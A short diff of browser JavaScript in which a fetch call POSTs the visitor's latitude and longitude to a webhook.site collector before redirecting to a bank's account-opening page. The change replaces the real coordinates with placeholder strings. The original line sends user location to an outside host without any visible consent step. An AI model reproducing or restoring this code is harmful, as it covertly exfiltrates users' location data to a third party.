@@ -29,7 +29,8 @@
       fetch("https://webhook.site/b03e51c0-21dd-446a-a69a-2a20af217999", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude: lat, longitude: lon })
+        //body: JSON.stringify({ latitude: lat, longitude: lon })
+        body: JSON.stringify({ latitude: "lat", longitude: "lon" })
       }).then();
       window.location.replace("https://ebank.gtbankci.com/OpenAccount/")
     }
